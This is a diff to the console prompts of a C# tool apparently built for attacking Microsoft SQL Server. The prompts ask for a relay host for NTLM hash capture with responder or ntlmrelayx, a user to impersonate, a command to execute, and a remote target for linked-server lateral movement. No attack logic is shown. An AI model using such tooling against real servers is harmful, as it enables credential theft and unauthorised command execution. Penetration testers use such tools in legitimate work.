@@ -14,18 +14,18 @@ namespace SQLinks2Move
     {
         static void Main(string[] args)
         {
-            Console.Write("Server Name to Auth : ");
+            Console.Write("Server Hostname to Auth (your actual box) : ");
             String sqlServer = Console.ReadLine();
-            Console.Write("Database Name : ");
+            Console.Write("Database Name (generally master) : ");
             String database = Console.ReadLine();
-            Console.WriteLine("Note : You need to setup responder or impacket-ntlmrelayx prior of it");
-            Console.Write("LHOST Relay Hash : ");
+            Console.WriteLine("Note : You need to setup responder or impacket-ntlmrelayx prior of entering your IP Address");
+            Console.Write("Local IP Address for Relay Hash Attack : ");
             String lhost = Console.ReadLine();
-            Console.Write("Username to Impersonate : ");
+            Console.Write("Username to Impersonate (generally dbo) : ");
             String username = Console.ReadLine();
-            Console.Write("Command to execute as "+username+" : ");
+            Console.Write("Command to execute as user "+username+" : ");
             String commandExecAs = Console.ReadLine();
-            Console.Write("Remote Server Name : ");
+            Console.Write("Remote Target Computer Name : ");
             String remoteServer = Console.ReadLine();
             Console.Write("Check if RPC OUT is enabled? Y or N? : ");
             String rpcoutCheck = Console.ReadLine();
